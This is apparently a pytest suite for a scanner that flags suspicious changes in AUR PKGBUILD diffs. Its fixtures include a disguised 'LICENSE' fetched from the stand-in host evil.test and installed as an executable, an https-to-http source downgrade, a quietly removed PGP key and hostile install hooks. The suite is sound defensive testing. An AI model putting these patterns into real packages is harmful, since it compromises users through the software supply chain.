"""Hardening audit of the unreleased surface (2026-11-02).

Every case pins a bypass, a silent disable or a release leak found while
exercising the build as a user and as an attacker.  True-positive twins are
kept beside each correction.
"""

from __future__ import annotations

import difflib
import io
import tarfile
from pathlib import Path

import pytest

from scripts.calibration_gates import shipped_config
from trustsight.analysis import scan_diff
from trustsight.config import load_config, load_rules

ROOT = Path(__file__).resolve().parents[2]


def _ids(diff, current=None, tree=None, pkg="demo"):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name=pkg, current_text=current,
                         tree_manifest=tree)
    return {entry.rule_id for entry in fact.score_breakdown}


def _all(diff, current=None, pkg="demo"):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name=pkg, current_text=current)
    return fact, {entry.rule_id for entry in fact.score_breakdown}


def _diff(pre, post, path="PKGBUILD"):
    return "".join(difflib.unified_diff(
        [line + "\n" for line in pre], [line + "\n" for line in post],
        f"a/{path}", f"b/{path}", n=3))


def _hook_diff(body):
    head = "".join(difflib.unified_diff(
        [], ["pkgname=p\n", "pkgver=1\n", "install=p.install\n"],
        "a/PKGBUILD", "b/PKGBUILD"))
    return head + "".join(difflib.unified_diff(
        [], body.splitlines(True), "a/p.install", "b/p.install"))


# --- anergy: a new anergic entry is a gated policy change -----------------

def test_anergy_and_analysis_paths_are_signed_critical():
    from scripts.critical_paths import CRITICAL_PATHS, CRITICAL_PREFIXES

    assert {"src/trustsight/anergy.py", "src/trustsight/anergy.json"} <= CRITICAL_PATHS
    assert "scripts/calibration_gates.py" in CRITICAL_PATHS
    assert "src/trustsight/analysis/" in CRITICAL_PREFIXES
    assert "scripts/calibration/" in CRITICAL_PREFIXES


def test_a_new_anergic_entry_must_be_changelogged(monkeypatch):
    from trustsight import anergy
    from trustsight.anergy import ANERGIC, AnergyEntry
    from scripts.gates._process import gate_anergic_entries_are_changelogged

    monkeypatch.setattr(anergy, "_ENTRIES", {
        "X001": AnergyEntry("X001", ANERGIC, "signal", "0.27.0", "promotion"),
    }, raising=False)
    gate = gate_anergic_entries_are_changelogged()
    assert not gate.passed
    assert "X001" in gate.detail


# --- doc-source provenance is not a filename allowlist ---------------------

_PRE = [
    "pkgname=demo-bin", "pkgver=1", "pkgrel=1",
    'url="https://github.com/demo/demo"',
    'source=("https://github.com/demo/demo/archive/v1.tar.gz")',
]


def _doc_case(entry, body):
    post = _PRE[:4] + [
        f'source=("https://github.com/demo/demo/archive/v1.tar.gz" "{entry}")',
        *body,
    ]
    return _all(_diff(_PRE, post), "\n".join(post) + "\n", pkg="demo-bin")[1]


def test_a_doc_named_payload_from_an_unknown_host_is_charged():
    ids = _doc_case("https://evil.test/LICENSE",
                    ["package() {", '  install -Dm755 LICENSE "$pkgdir/usr/bin/x"', "}"])
    assert {"C011", "SOURCE_BUCKET"} <= ids


def test_a_doc_named_archive_is_not_documentation():
    ids = _doc_case("https://evil.test/LICENSE.tar.gz",
                    ["package() {", '  install -Dm755 LICENSE.tar.gz "$pkgdir/usr/bin/x"', "}"])
    assert "C011" in ids


def test_a_doc_source_on_the_declared_upstream_stays_quiet():
    ids = _doc_case("https://github.com/demo/demo/raw/v1/LICENSE",
                    ["package() {", '  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/demo/LICENSE"', "}"])
    assert "C011" not in ids and "SOURCE_BUCKET" not in ids


# --- X013: populate only a keyring the package ships -----------------------

def _populate_case(current, name):
    return _ids(_hook_diff(f"post_install() {{\n  pacman-key --populate {name}\n}}\n"), current)


def test_x013_shipped_keyring_populate_is_quiet():
    current = ('pkgname=p\npkgver=1\npkgrel=1\ninstall=p.install\n'
               'source=("a.tar.gz" "auto-aur.gpg")\n')
    assert "X013" not in _populate_case(current, "auto-aur")


def test_x013_unshipped_populate_still_fires():
    current = ('pkgname=p\npkgver=1\npkgrel=1\ninstall=p.install\n'
               'source=("a.tar.gz" "https://evil.test/LICENSE")\n')
    assert "X013" in _populate_case(current, "LICENSE")


def test_x013_distribution_keyring_is_quiet():
    current = ('pkgname=p\npkgver=1\npkgrel=1\ninstall=p.install\n'
               'source=("a.tar.gz")\n')
    assert "X013" not in _populate_case(current, "archlinux")


# --- T004/T005: decoys and fragment-only downgrades -----------------------

def test_t004_a_decoy_key_does_not_hide_a_removal():
    pre = ["pkgname=demo", "pkgver=1", "pkgrel=1",
           "validpgpkeys=('AAA' 'BBB' 'CCC')"]
    post = pre[:-1] + ["validpgpkeys=('AAA' 'BBB' 'DDD')"]
    assert "T004" in _ids(_diff(pre, post), "\n".join(post) + "\n")


def test_t004_widening_stands_down():
    pre = ["pkgname=demo", "pkgver=1", "pkgrel=1",
           "validpgpkeys=('AAA' 'BBB')"]
    post = pre[:-1] + ["validpgpkeys=('AAA' 'BBB' 'CCC')"]
    assert "T004" not in _ids(_diff(pre, post), "\n".join(post) + "\n")


def _t005(pre_url, post_url, decoy=None):
    pre = ["pkgname=p", "pkgver=1", "pkgrel=1", f'source=("{pre_url}")']
    entries = [f'"{post_url}"'] if decoy is None else [f'"{decoy}"', f'"{post_url}"']
    post = ["pkgname=p", "pkgver=1", "pkgrel=1", f'source=({", ".join(entries)})']
    return _ids(_diff(pre, post), "\n".join(post) + "\n")


def test_t005_a_fragment_only_downgrade_fires():
    assert "T005" in _t005("https://host.test/x#a", "http://host.test/x#b")


def test_t005_the_exact_downgrade_stays_h019():
    ids = _t005("https://host.test/x", "http://host.test/x")
    assert "T005" not in ids and "H019" in ids


def test_t005_a_decoy_insertion_does_not_shift_the_pair():
    assert "T005" in _t005(
        "https://host.test/x", "http://host.test/y", decoy="dummy.tar.gz")


# --- X002 one-line function and case arm ----------------------------------

def test_x002_one_line_function_body_fires():
    pre = ["pkgname=p", "pkgver=1", "pkgrel=1", "build() {", " :", "}"]
    post = pre[:-1] + [' f() { "$X" --x; }; f', "}"]
    assert "X002" in _ids(_diff(pre, post), "\n".join(post) + "\n")


def test_x002_one_line_case_arm_fires():
    pre = ["pkgname=p", "pkgver=1", "pkgrel=1", "build() {", " :", "}"]
    post = pre[:-1] + [' case x in x) "$X" --x;; esac', "}"]
    assert "X002" in _ids(_diff(pre, post), "\n".join(post) + "\n")


# --- H108 printer prose ----------------------------------------------------

def test_h108_unquoted_printer_prose_is_quiet():
    current = "pkgname=p\npkgver=1\ninstall=p.install\n"
    for body in ('post_install() {\n  echo run wxlauncher at least once\n}\n',
                 'post_install() {\n  printf run wxlauncher at least once\\n\n}\n'):
        assert "H108" not in _ids(_hook_diff(body), current)


def test_h108_a_real_at_job_still_fires():
    current = "pkgname=p\npkgver=1\ninstall=p.install\n"
    assert "H108" in _ids(_hook_diff("post_install() {\n  at now\n}\n"), current)


# --- C033 inline prose and C034 diff fallback ------------------------------

def test_c033_counts_inline_comments():
    pre = (["pkgname=p", "pkgver=1", "pkgrel=1"]
           + [f"build{i}() {{ :; }}  # prose {i}" for i in range(10)]
           + ["build() {", " :", "}"])
    post = (["pkgname=p", "pkgver=1", "pkgrel=1"]
            + [f"build{i}() {{ :; }}  # prose {i}" for i in range(2)]
            + ["build() {", " :", "}"])
    assert "C033" in _ids(_diff(pre, post), "\n".join(post) + "\n")


def test_c034_reads_srcinfo_from_the_diff_without_a_manifest():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
        " pkgname=demo\n-pkgver=1\n+pkgver=2\n"
        "--- a/.SRCINFO\n+++ b/.SRCINFO\n@@ -1,3 +1,3 @@\n"
        " pkgbase = demo\n-\tpkgver = 1\n+\tpkgver = 1\n \tpkgrel = 1\n"
    )
    assert "C034" in _ids(
        diff, "pkgname=demo\npkgver=2\npkgrel=1\n")


# --- SOURCE_BUCKET exact vendor hosts --------------------------------------

def test_source_bucket_vendor_hosts_are_exact():
    from trustsight.buckets import classify_url

    assert classify_url("https://automation.izoone.com/x")[0] == "official"
    assert classify_url("https://evil.automation.izoone.com/x")[0] == "unknown"
    assert classify_url("https://dl.discordapp.net/x")[0] == "official"
    assert classify_url("https://evil.discordapp.net/x")[0] == "unknown"


# --- release and first-run -------------------------------------------------

def test_the_release_tarball_refuses_a_tracked_env_file():
    import sys

    sys.path.insert(0, str(ROOT / "scripts"))
    import build_release_tarball as brt

    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as archive:
        data = b"SECRET=1\n"
        info = tarfile.TarInfo("trustsight-0.0.0/.env")
        info.size = len(data)
        archive.addfile(info, io.BytesIO(data))
    with pytest.raises(SystemExit):
        brt._refuse_secret_members(raw.getvalue())


def test_dockerignore_covers_nested_local_state():
    text = (ROOT / ".dockerignore").read_text()
    assert "**/deploy/" in text
    assert "**/.env" in text


def test_publishing_fetches_real_history_for_ancestry():
    text = (ROOT / ".github/workflows/publishing.yml").read_text()
    assert "git fetch origin master --no-tags" in text
    assert "git fetch origin master --depth=1" not in text


def test_first_run_does_not_warn_about_a_missing_config(tmp_path, monkeypatch, caplog):
    import logging
    from trustsight.config import _release

    monkeypatch.setattr(_release, "_config_dir", lambda: tmp_path)
    monkeypatch.setattr(_release, "_PARSE_WARNED", set(), raising=False)
    with caplog.at_level(logging.WARNING):
        _release.configured_baseline_tag()
    assert "could not be parsed" not in caplog.text


def test_h100_first_submission_still_alerts_on_the_hook():
    diff = (
        "--- /dev/null\n+++ b/PKGBUILD\n@@ -0,0 +1,4 @@\n"
        "+pkgname=p\n+pkgver=1\n+pkgrel=1\n+install=p.install\n"
        "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,3 @@\n"
        "+post_install() {\n+  systemctl enable --now p\n+}\n"
    )
    ids = _ids(diff, "pkgname=p\npkgver=1\npkgrel=1\ninstall=p.install\n")
    assert "H100" not in ids
    assert {"H017", "H108", "X015"} <= ids
